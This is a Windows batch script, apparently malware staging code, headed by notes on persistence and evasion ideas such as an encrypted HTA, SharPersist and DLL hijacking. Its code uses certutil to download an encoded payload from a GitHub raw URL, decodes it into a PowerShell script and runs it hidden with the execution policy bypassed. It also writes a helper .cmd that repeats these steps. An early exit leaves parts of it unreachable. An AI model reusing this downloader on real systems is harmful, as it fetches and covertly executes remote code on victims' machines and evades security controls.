

::litany of things on the hard sik, one gets exec, we have a run on.. [just try dissociate from source file]
::

::Exe
	::ps1 to exe. encrypted, signed,
::Assets
	::File format
		::DemiGuise - Encrypted HTA (safe, hand custom made zero malicious file format pls)
::Scripts
::signed ps1 run via schtasks
::Frameworks
	::pesistence specific framework..sharpersist .. maybe can already account for .exe & bat files being too hot on the disk right...?
::sw

:: dll hijack

:: autorun for file format

@echo off
color 1b

C:

cd.. || cd .. & cd.. || cd .. & cd.. || cd .. & cd / & cd Users || cd "Users" & cd Public || cd "Public"

mkdir pound-sterling
exit

echo certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/argene-nyc/sevilla/master/2MiCert.uiaq" 2MiCert.uiaq > 2MiCert.cmd
echo certutil.exe -decode 2MiCert.uiaq 2MiCert.ps1 >> 2MiCert.cmd

echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 2MiCert.ps1 >> 2MiCert.cmd
:sierra

IF EXIST 2MiCert.cmd (
	
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -Command Start .\2MiCert.cmd -WindowStyle Hidden
	exit
	
) ELSE (
	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/argene-nyc/sevilla/master/2MiCert.uiaq" 2MiCert.uiaq
	
	certutil.exe -decode 2MiCert.uiaq 2MiCert.ps1 & del /F /Q 2MiCert.uiaq
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File 2MiCert.ps1

)

